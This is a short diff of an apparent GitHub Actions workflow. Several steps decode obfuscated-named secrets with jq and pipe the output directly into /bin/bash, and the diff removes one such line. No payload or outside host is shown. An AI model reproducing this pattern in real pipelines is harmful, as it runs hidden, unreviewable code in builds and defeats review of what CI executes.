@@ -18,7 +18,6 @@ jobs:
           xhkt8: ${{ secrets.xhkt8 }}
         run: |
           printf '%s' "$xhkt8" | jq -r .o7 | /bin/bash
-          printf '%s' "$cvip6" | jq -r .lhtd6 | /bin/bash
           echo $oxc6 | jq -r .wsgyh1 | /bin/bash
           echo $zygk0006 | jq -r .ulf2 | /bin/bash
           printf '%s' "$fk027" | jq -r .ecnc44562 | /bin/bash
